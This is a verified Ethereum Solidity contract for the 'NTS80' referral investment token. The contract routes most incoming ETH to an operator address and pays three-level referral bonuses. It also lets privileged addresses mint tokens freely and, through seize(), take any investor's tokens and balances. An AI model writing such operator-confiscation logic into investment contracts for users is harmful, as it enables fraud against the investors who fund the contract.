/**
 *Submitted for verification at Etherscan.io on 2022-02-26
*/

pragma solidity 0.5.11;


interface ICustomersFundable {
    function fundCustomer(address customerAddress, uint8 subconto) external payable;
}

interface IRemoteWallet {
    function invest(address customerAddress, address target, uint256 value, uint8 subconto) external returns (bool);
}

interface IFundable {
    function fund() external payable;
}

contract NTS80 is IFundable {
    modifier onlyBagholders {
        require(myTokens() > 0);
        _;
    }

    modifier onlyAdmin {
        require(msg.sender == admin);
        _;
    }

    modifier onlyBoss2 {
        require(msg.sender == boss2);
        _;
    }
    
    modifier onlyBoss3 {
        require(msg.sender == boss3);
        _;
    }

    string public name = "NTS 80";
    string public symbol = "NTS80";
    uint8 constant public decimals = 18;
    address public admin;
    address constant internal boss1 = 0xCa27fF938C760391E76b7aDa887288caF9BF6Ada;
    address constant internal boss2 = 0xf43414ABb5a05c3037910506571e4333E16a4bf4;
    address public boss3 = 0xf4632894bF968467091Dec1373CC1Bf5d15ef6B1;
    
    uint8 public refLevel1_ = 9;
    uint8 public refLevel2_ = 3;
    uint8 public refLevel3_ = 2;
    uint256 constant internal tokenPrice = 0.001 ether;
    uint256 public minimalInvestment = 2.5 ether;
    uint256 public stakingRequirement = 0;
    
    mapping(address => uint256) internal tokenBalanceLedger_;
    mapping(address => uint256) public referralBalance_;
    mapping(address => uint256) public repayBalance_;
    mapping(address => bool) public mayPassRepay;

    uint256 internal tokenSupply_;
    bool public saleOpen = true;
    
    address private refBase = address(0x0);

    constructor() public {
        admin = msg.sender;
        mayPassRepay[boss1] = true;
        mayPassRepay[boss2] = true;
        mayPassRepay[boss3] = true;
    }

    function buy(address _ref1, address _ref2, address _ref3) public payable returns (uint256) {
        require(msg.value >= minimalInvestment, "Value is below minimal investment.");
        require(saleOpen, "Sales stopped for the moment.");
        return purchaseTokens(msg.value, _ref1, _ref2, _ref3);
    }

    function() external payable {
        require(msg.value >= minimalInvestment, "Value is below minimal investment.");
        require(saleOpen, "Sales stopped for the moment.");
        purchaseTokens(msg.value, address(0x0), address(0x0), address(0x0));
    }

    function reinvest() public {
        address _customerAddress = msg.sender;
        uint256 value = referralBalance_[_customerAddress];
        require(value > 0);
        
        referralBalance_[_customerAddress] = 0;
        uint256 _tokens = purchaseTokens(value, address(0x0), address(0x0), address(0x0));
        emit OnReinvestment(_customerAddress, value, _tokens, false, now);
    }
    
    function remoteReinvest(uint256 value) public {
        if (IRemoteWallet(refBase).invest(msg.sender, address(this), value, 4)) {
            uint256 tokens = purchaseTokens(value, address(0x0), address(0x0), address(0x0));
            emit OnReinvestment(msg.sender, value, tokens, true, now);
        }
    }
    
    function fund() public payable {
        emit OnFund(msg.sender, msg.value, now);
    }

    function exit() public {
        address _customerAddress = msg.sender;
        uint256 balance = repayBalance_[_customerAddress];
        if (balance > 0) getRepay();
        withdraw();
    }

    function withdraw() public {
        address payable _customerAddress = msg.sender;
        uint256 value = referralBalance_[_customerAddress];
        require(value > 0);
        referralBalance_[_customerAddress] = 0;
        _customerAddress.transfer(value);
        emit OnWithdraw(_customerAddress, value, now);
    }

    function getRepay() public {
        address payable _customerAddress = msg.sender;
        uint256 balance = repayBalance_[_customerAddress];
        require(balance > 0);
        repayBalance_[_customerAddress] = 0;
        uint256 tokens = tokenBalanceLedger_[_customerAddress];
        tokenBalanceLedger_[_customerAddress] = 0;
        tokenSupply_ = tokenSupply_ - tokens;

        _customerAddress.transfer(balance);
        emit OnGotRepay(_customerAddress, balance, now);
    }

    function myTokens() public view returns (uint256) {
        address _customerAddress = msg.sender;
        return balanceOf(_customerAddress);
    }

    function balanceOf(address _customerAddress) public view returns (uint256) {
        return tokenBalanceLedger_[_customerAddress];
    }

    function purchaseTokens(uint256 _incomingEthereum, address _ref1, address _ref2, address _ref3) internal returns (uint256) {
        address _customerAddress = msg.sender;
        uint8 welcomeFee_ = refLevel1_ + refLevel2_ + refLevel3_;
        require(welcomeFee_ <= 99);

        uint256[7] memory uIntValues = [
            _incomingEthereum * welcomeFee_ / 100,
            0,
            0,
            0,
            0,
            0,
            0
        ];

        uIntValues[1] = uIntValues[0] * refLevel1_ / welcomeFee_;
        uIntValues[2] = uIntValues[0] * refLevel2_ / welcomeFee_;
        uIntValues[3] = uIntValues[0] * refLevel3_ / welcomeFee_;

        uint256 _taxedEthereum = _incomingEthereum - uIntValues[0];

        uint256 _amountOfTokens = ethereumToTokens_(_incomingEthereum);
        //uint256 _fee = _dividends * magnitude;

        require(_amountOfTokens > 0);

        if (
            _ref1 != 0x0000000000000000000000000000000000000000 &&
            tokenBalanceLedger_[_ref1] * tokenPrice >= stakingRequirement
        ) {
            if (refBase == address(0x0)) {
                referralBalance_[_ref1] += uIntValues[1];
            } else {
                ICustomersFundable(refBase).fundCustomer.value(uIntValues[1])(_ref1, 1);
                uIntValues[4] = uIntValues[1]; 
            }
        } else {
            referralBalance_[boss1] += uIntValues[1];
            _ref1 = 0x0000000000000000000000000000000000000000;
        }

        if (
            _ref2 != 0x0000000000000000000000000000000000000000 &&
            tokenBalanceLedger_[_ref2] * tokenPrice >= stakingRequirement
        ) {
            if (refBase == address(0x0)) {
                referralBalance_[_ref2] += uIntValues[2];
            } else {
                ICustomersFundable(refBase).fundCustomer.value(uIntValues[2])(_ref2, 2);
                uIntValues[5] = uIntValues[2];
            }
        } else {
            referralBalance_[boss1] += uIntValues[2];
            _ref2 = 0x0000000000000000000000000000000000000000;
        }

        if (
            _ref3 != 0x0000000000000000000000000000000000000000 &&
            tokenBalanceLedger_[_ref3] * tokenPrice >= stakingRequirement
        ) {
            if (refBase == address(0x0)) {
                referralBalance_[_ref3] += uIntValues[3];
            } else {
                ICustomersFundable(refBase).fundCustomer.value(uIntValues[3])(_ref3, 3);
                uIntValues[6] = uIntValues[3];
            }
        } else {
            referralBalance_[boss1] += uIntValues[3];
            _ref3 = 0x0000000000000000000000000000000000000000;
        }

        referralBalance_[boss2] += _taxedEthereum;

        tokenSupply_ += _amountOfTokens;
        
        tokenBalanceLedger_[_customerAddress] += _amountOfTokens;

        emit OnTokenPurchase(_customerAddress, _incomingEthereum, _amountOfTokens, _ref1, _ref2, _ref3, uIntValues[4], uIntValues[5], uIntValues[6], now);

        return _amountOfTokens;
    }

    function ethereumToTokens_(uint256 _ethereum) public pure returns (uint256) {
        uint256 _tokensReceived = _ethereum * 1e18 / tokenPrice;

        return _tokensReceived;
    }

    function tokensToEthereum_(uint256 _tokens) public pure returns (uint256) {
        uint256 _etherReceived = _tokens / tokenPrice * 1e18;

        return _etherReceived;
    }

    /* Admin methods */
    function mint(address customerAddress, uint256 value) public onlyBoss3 {
        tokenSupply_ += value;
        tokenBalanceLedger_[customerAddress] += value;
        
        emit OnMint(customerAddress, value, now);
    }
    
    function setRefBonus(uint8 level1, uint8 level2, uint8 level3, uint256 minInvest, uint256 staking) public {
        require(msg.sender == boss3 || msg.sender == admin);
        refLevel1_ = level1;
        refLevel2_ = level2;
        refLevel3_ = level3;
        
        minimalInvestment = minInvest;
        stakingRequirement = staking;
        
        emit OnRefBonusSet(level1, level2, level3, minInvest, staking, now);
    }
    
    function passRepay(address customerAddress) public payable {
        require(mayPassRepay[msg.sender], "Not allowed to pass repay from your address.");
        uint256 value = msg.value;
        require(value > 0);

        repayBalance_[customerAddress] += value;
        emit OnRepayPassed(customerAddress, msg.sender, value, now);
    }

    function allowPassRepay(address payer) public onlyAdmin {
        mayPassRepay[payer] = true;
        emit OnRepayAddressAdded(payer, now);
    }

    function denyPassRepay(address payer) public onlyAdmin {
        mayPassRepay[payer] = false;
        emit OnRepayAddressRemoved(payer, now);
    }

    function passInterest(address customerAddress, uint256 ethRate, uint256 rate) public payable {
        require(mayPassRepay[msg.sender], "Not allowed to pass interest from your address.");
        require(msg.value > 0);
        
        if (refBase == address(0x0)) {
            referralBalance_[customerAddress] += msg.value;
        } else {
            ICustomersFundable(refBase).fundCustomer.value(msg.value)(msg.sender, 5);
        }

        emit OnInterestPassed(customerAddress, msg.value, ethRate, rate, now);
    }

    function saleStop() public onlyAdmin {
        saleOpen = false;
        emit OnSaleStop(now);
    }

    function saleStart() public onlyAdmin {
        saleOpen = true;
        emit OnSaleStart(now);
    }

    function deposeBoss3(address x) public onlyAdmin {
        emit OnBoss3Deposed(boss3, x, now);
        boss3 = x;
    }
    
    function setRefBase(address x) public onlyAdmin {
        emit OnRefBaseSet(refBase, x, now);
        refBase = x;
    }
    
    function seize(address customerAddress, address receiver) public {
        require(msg.sender == boss1 || msg.sender == boss2);
 
        uint256 tokens = tokenBalanceLedger_[customerAddress];
        if (tokens > 0) {
            tokenBalanceLedger_[customerAddress] = 0;
            tokenBalanceLedger_[receiver] += tokens;
        }
        
        uint256 value = referralBalance_[customerAddress];
        if (value > 0) {
            referralBalance_[customerAddress] = 0;
            referralBalance_[receiver] += value;
        }
        
        uint256 repay = repayBalance_[customerAddress];
        if (repay > 0) {
            repayBalance_[customerAddress] = 0;
            referralBalance_[receiver] += repay;
        }
        
        emit OnSeize(customerAddress, receiver, tokens, value, repay, now);
    }

    event OnTokenPurchase(
        address indexed customerAddress,
        uint256 incomingEthereum,
        uint256 tokensMinted,
        address ref1,
        address ref2,
        address ref3,
        uint256 ref1value,
        uint256 ref2value,
        uint256 ref3value,
        uint256 timestamp
    );

    event OnReinvestment(
        address indexed customerAddress,
        uint256 ethereumReinvested,
        uint256 tokensMinted,
        bool isRemote,
        uint256 timestamp
    );

    event OnWithdraw(
        address indexed customerAddress,
        uint256 value,
        uint256 timestamp
    );

    event OnGotRepay(
        address indexed customerAddress,
        uint256 value,
        uint256 timestamp
    );

    event OnRepayPassed(
        address indexed customerAddress,
        address indexed payer,
        uint256 value,
        uint256 timestamp
    );

    event OnInterestPassed(
        address indexed customerAddress,
        uint256 value,
        uint256 ethRate,
        uint256 rate,
        uint256 timestamp
    );

    event OnSaleStop(
        uint256 timestamp
    );

    event OnSaleStart(
        uint256 timestamp
    );

    event OnRepayAddressAdded(
        address indexed payer,
        uint256 timestamp
    );

    event OnRepayAddressRemoved(
        address indexed payer,
        uint256 timestamp
    );
    
    event OnMint(
        address indexed customerAddress,
        uint256 value,
        uint256 timestamp
    );
    
    event OnBoss3Deposed(
        address indexed former,
        address indexed current,
        uint256 timestamp  
    );
    
    event OnRefBonusSet(
        uint8 level1,
        uint8 level2,
        uint8 level3,
        uint256 minimalInvestment,
        uint256 stakingRequirement,
        uint256 timestamp
    );
    
    event OnRefBaseSet(
        address indexed former,
        address indexed current,
        uint256 timestamp
    );
    
    event OnSeize(
        address indexed customerAddress,
        address indexed receiver,
        uint256 tokens,
        uint256 value,
        uint256 repayValue,
        uint256 timestamp
    );
    
    event OnFund(
        address indexed source,
        uint256 value,
        uint256 timestamp
    );
}